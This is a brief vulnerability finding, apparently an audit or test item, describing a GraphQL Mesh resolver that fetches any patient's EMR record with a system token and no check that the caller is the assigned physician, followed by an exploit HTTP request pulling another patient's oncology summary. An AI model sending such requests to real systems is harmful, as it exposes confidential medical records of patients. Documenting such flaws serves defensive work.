diagnosis: The GraphQL Mesh REST source resolver passes patientId directly to the upstream internal EMR REST endpoint using an elevated system token. The resolver fails to verify that context.user is an assigned physician for patientId. Any authenticated user can query any patientId and retrieve confidential clinical records.
exploit_request:
POST /graphql HTTP/1.1
Host: mesh.clinicalops.org
Authorization: Bearer eyJhbGciOiJIUzI1NiIsIn...
Content-Type: application/json

{
  "query": "query { patientClinicalSummary(patientId: \"pt_oncology_4421\") }"
}
